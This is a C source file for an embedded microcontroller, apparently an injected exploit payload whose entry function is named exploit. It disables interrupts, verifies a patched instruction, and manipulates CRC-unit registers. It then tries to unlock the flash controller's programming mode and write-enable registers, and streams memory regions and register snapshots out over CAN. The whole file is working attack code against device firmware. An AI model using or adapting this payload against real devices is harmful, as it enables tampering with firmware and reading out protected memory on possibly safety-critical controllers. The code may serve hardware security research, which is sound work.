#define PROBE_PE_CYCLE_PAYLOAD 1
#include "common.h"
#include "dcra.h"

#define FACI_PE_POLL_LIMIT 100000u
#define FACI_FPCKAR MMIO16(0xFFA10084u)
#define FACI_FENTRYR MMIO16(0xFFA10088u)
#define FACI_FREQR MMIO16(0xFFA10020u)
#define FLWL_REG MMIO32(0xFFF8A430u)
#define FLWE_REG MMIO32(0xFFF82410u)

static const uint8_t original_instruction[4] = {0x20, 0xE6, 0x31, 0x00};

static int equal_bytes(const volatile uint8_t *left, const uint8_t *right, uint32_t length) {
  uint32_t index;
  uint8_t difference = 0u;
  for (index = 0u; index < length; ++index) difference |= left[index] ^ right[index];
  return difference == 0u;
}

static void capture_snapshot(uint32_t values[8]) {
  values[0] = MMIO8(0xFFA10000u);
  values[1] = MMIO32(0xFFA10080u);
  values[2] = MMIO8(0xFFA10010u);
  values[3] = FACI_FPCKAR;
  values[4] = FACI_FENTRYR;
  values[5] = FACI_FREQR;
  values[6] = FLWL_REG;
  values[7] = FLWE_REG;
}

static int snapshot_is_idle(const uint32_t values[8]) {
  return values[0] == 0x80u && values[1] == 0x00008000u && values[2] == 0u
    && values[3] == 0u && values[4] == 0u && values[5] == 0u
    && values[6] == 0u && values[7] == 0u;
}

static int snapshots_equal(const uint32_t left[8], const uint32_t right[8]) {
  uint8_t index;
  uint32_t difference = 0u;
  for (index = 0u; index < 8u; ++index) difference |= left[index] ^ right[index];
  return difference == 0u;
}

static void duplicate_snapshot(const uint32_t source[8], uint32_t destination[8]) {
  uint8_t index;
  for (index = 0u; index < 8u; ++index) destination[index] = source[index];
}

static int __attribute__((noinline)) wait_register_masked(
  uint32_t address,
  uint8_t width,
  uint32_t mask,
  uint32_t expected,
  const struct runtime_guard *guard
) {
  uint32_t spins = FACI_PE_POLL_LIMIT;
  while (spins != 0u) {
    uint32_t value = width == 2u ? MMIO16(address) : MMIO32(address);
    if ((value & mask) == expected) return 0;
    --spins;
    if ((spins & 0x3FFFu) == 0u) feed_watchdog(guard);
  }
  return 1;
}

static int send_comprehensive_stream(
  const uint32_t values[PROTO_DCRA_RECORD_COUNT],
  uint32_t magic0,
  uint32_t magic1,
  const uint32_t snapshots[40],
  uint32_t outcome,
  const struct runtime_guard *guard
) {
  static const uint8_t widths[8] = {1u, 4u, 1u, 2u, 2u, 2u, 4u, 4u};
  uint32_t combined_crc = 0xFFFFFFFFu;
  uint32_t slot;
  uint32_t begin = ((uint32_t)PROTO_VERSION << 8)
    | ((uint32_t)PROTO_OP_FACI_PE_CYCLE << 16);
  if (can_send(PROTO_BEGIN0 | begin, CRC_RANGE_START, guard) != 0) return 1;
  if (can_send(PROTO_BEGIN1 | begin | (1u << 24), 2u, guard) != 0) return 2;
  if (stream_probe_region(PROTO_OP_FACI_PE_CYCLE, 0u, TARGET_BASE, guard, &combined_crc) != 0) return 3;
  if (stream_probe_region(PROTO_OP_FACI_PE_CYCLE, 1u, CRC_SECTOR_BASE, guard, &combined_crc) != 0) return 4;
  for (slot = 0u; slot < PROTO_DCRA_RECORD_COUNT; ++slot) {
    if (can_send(PROTO_CRC_RECORD | (slot << 8) | (4u << 16), values[slot], guard) != 0) return 5;
  }
  if (can_send(PROTO_MAGIC, magic0, guard) != 0) return 6;
  if (can_send(PROTO_MAGIC | (1u << 8), magic1, guard) != 0) return 7;
  for (slot = 0u; slot < 40u; ++slot) {
    if (send_diagnostic(slot, widths[slot & 7u], snapshots[slot], guard) != 0) return 8;
  }
  if (send_status_code(1u, outcome, guard) != 0) return 9;
  return can_send(PROTO_END, combined_crc ^ 0xFFFFFFFFu, guard);
}

void exploit(void) __attribute__((section(".text.entry"), used, noreturn));

void exploit(void) {
  struct runtime_guard guard;
  uint32_t values[PROTO_DCRA_RECORD_COUNT] = {0u};
  uint32_t snapshots[40];
  uint32_t magic0;
  uint32_t magic1;
  uint16_t primary_code = 0u;
  uint16_t cleanup_code = 0u;
  uint8_t unlock_attempted = 0u;
  uint8_t flwl_attempted = 0u;
  uint8_t flwe_attempted = 0u;
  uint8_t fentry_attempted = 0u;

  __asm__ volatile ("di");
  runtime_begin(&guard);
  magic0 = MMIO32(MAGIC0_ADDRESS);
  magic1 = MMIO32(MAGIC1_ADDRESS);
  if (magic0 != MAGIC_WORD || magic1 != MAGIC_WORD) primary_code = 1u;

  if (primary_code == 0u && !equal_bytes(
    (volatile uint8_t *)(PATCH_ADDRESS - 2u), original_instruction, 4u
  )) primary_code = 2u;

  capture_dcra(&values[PROTO_DCRA_ENTRY_CTL], &values[PROTO_DCRA_ENTRY_COUT]);
  values[PROTO_DCRA_RANGE_START] = CRC_RANGE_START;
  values[PROTO_DCRA_RANGE_END] = CRC_RANGE_END;
  values[PROTO_DCRA_ADJUST_ADDRESS] = CRC_ADJUST;
  values[PROTO_DCRA_OLD_ADJUST_WORD] = MMIO32(CRC_ADJUST);
  values[PROTO_DCRA_NEW_ADJUST_WORD] = CRC_PATCHED_ADJUST_WORD;
  if ((values[PROTO_DCRA_ENTRY_CTL] & 3u) != 0u) {
    if (primary_code == 0u) primary_code = 3u;
  } else {
    values[PROTO_DCRA_ORIGINAL_RAW] = dcra_full_raw(0u, &guard);
    values[PROTO_DCRA_PATCHED_RAW] = dcra_full_raw(1u, &guard);
    if (restore_dcra(values[PROTO_DCRA_ENTRY_CTL], values[PROTO_DCRA_ENTRY_COUT]) != 0u) {
      if (primary_code == 0u) primary_code = 3u;
    }
  }
  values[PROTO_DCRA_EXIT_CTL] = DCRA_CTL;
  values[PROTO_DCRA_EXIT_COUT] = DCRA_COUT;
  if (primary_code == 0u
      && (values[PROTO_DCRA_EXIT_CTL] != values[PROTO_DCRA_ENTRY_CTL]
      || values[PROTO_DCRA_EXIT_COUT] != values[PROTO_DCRA_ENTRY_COUT])) {
    primary_code = 3u;
  }

  capture_snapshot(&snapshots[0]);
  if (primary_code == 0u && !snapshot_is_idle(&snapshots[0])) primary_code = 4u;
  duplicate_snapshot(&snapshots[0], &snapshots[8]);
  duplicate_snapshot(&snapshots[0], &snapshots[16]);
  duplicate_snapshot(&snapshots[0], &snapshots[24]);
  duplicate_snapshot(&snapshots[0], &snapshots[32]);

  if (primary_code == 0u) {
    unlock_attempted = 1u;
    FACI_FPCKAR = 0xAA01u;
    syncp();
    if (wait_register_masked(0xFFA10084u, 2u, 0xFFFFu, 0x0001u, &guard) != 0) {
      primary_code = 5u;
    }
    capture_snapshot(&snapshots[8]);
    if (primary_code != 0u) goto cleanup;

    flwl_attempted = 1u;
    FLWL_REG = 1u;
    flwe_attempted = 1u;
    FLWE_REG = 1u;
    syncp();
    if (wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 1u, &guard) != 0) {
      primary_code = 6u;
    }
    if (primary_code == 0u
        && wait_register_masked(0xFFF82410u, 4u, 0xFFFFFFFFu, 1u, &guard) != 0) {
      primary_code = 7u;
    }
    capture_snapshot(&snapshots[16]);
    if (primary_code != 0u) goto cleanup;

    FACI_FREQR = 0x3B00u;
    fentry_attempted = 1u;
    FACI_FENTRYR = 0x5501u;
    syncp();
    if (wait_register_masked(0xFFA10088u, 2u, 1u, 1u, &guard) != 0) {
      primary_code = 9u;
    }
    capture_snapshot(&snapshots[24]);
  }

cleanup:
  if (flwl_attempted != 0u) FLWL_REG = 0u;
  if (flwe_attempted != 0u) FLWE_REG = 0u;
  if (flwe_attempted != 0u) (void)FLWE_REG;
  syncp();
  if (fentry_attempted != 0u) FACI_FENTRYR = 0x5500u;
  if (unlock_attempted != 0u) FACI_FPCKAR = 0xAA00u;
  syncp();
  if (flwl_attempted != 0u
      && wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
    cleanup_code |= 0x0001u;
  }
  if (flwe_attempted != 0u
      && wait_register_masked(0xFFF82410u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
    cleanup_code |= 0x0002u;
  }
  if (fentry_attempted != 0u
      && wait_register_masked(0xFFA10088u, 2u, 1u, 0u, &guard) != 0) {
    cleanup_code |= 0x0004u;
  }
  if (unlock_attempted != 0u
      && wait_register_masked(0xFFA10084u, 2u, 0x0081u, 0u, &guard) != 0) {
    cleanup_code |= 0x0008u;
  }
  capture_snapshot(&snapshots[32]);
  if (!snapshots_equal(&snapshots[0], &snapshots[32])) cleanup_code |= 0x0010u;

  (void)send_comprehensive_stream(
    values, magic0, magic1, snapshots,
    ((uint32_t)cleanup_code << 16) | primary_code, &guard
  );
  runtime_end(&guard);
  for (;;) {
  }
}
